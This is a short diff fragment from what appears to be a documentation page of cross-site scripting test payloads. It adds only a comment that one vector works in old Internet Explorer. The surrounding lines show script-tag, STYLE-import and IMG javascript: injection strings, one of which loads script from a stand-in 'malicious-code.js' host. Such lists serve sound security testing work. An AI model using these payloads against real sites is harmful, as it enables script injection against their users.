@@ -37,6 +37,8 @@ order: 5
 \x3cscript src=http://www.example.com/malicious-code.js\x3e\x3c/script\x3e
 >"><script>alert("XSS")</script>&
 "><STYLE>@import"javascript:alert('XSS')";</STYLE>
+
+//Only works for IE6 and earlier
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')> 
